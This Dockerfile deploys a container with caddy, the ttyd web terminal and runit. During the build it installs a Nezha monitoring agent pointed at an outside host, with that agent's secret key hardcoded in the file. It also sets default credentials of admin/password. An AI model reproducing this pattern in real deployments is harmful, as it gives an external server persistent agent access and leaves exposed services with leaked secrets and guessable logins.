FROM python:alpine

COPY ./content /workdir/

RUN apk add --no-cache curl caddy jq bash runit tzdata ttyd p7zip findutils wget \
    && chmod +x /workdir/service/*/run /workdir/service/*/log/run /workdir/*.sh \
    && /workdir/install.sh \
    && /workdir/nezha.sh install_agent serverr.winkx.ga 5555 EuwLjauChaCRvnH0Af \
    && rm -rf /workdir/install.sh /tmp/* ${HOME}/.cache ${HOME}/.cargo

ENV PORT=3000
ENV GLOBAL_USER=admin
ENV GLOBAL_PASSWORD=password
ENV GLOBAL_LANGUAGE=chs
ENV GLOBAL_PORTAL_PATH=/xxr
ENV TZ=Asia/Shanghai

EXPOSE 3000

ENTRYPOINT ["sh","/workdir/entrypoint.sh"]
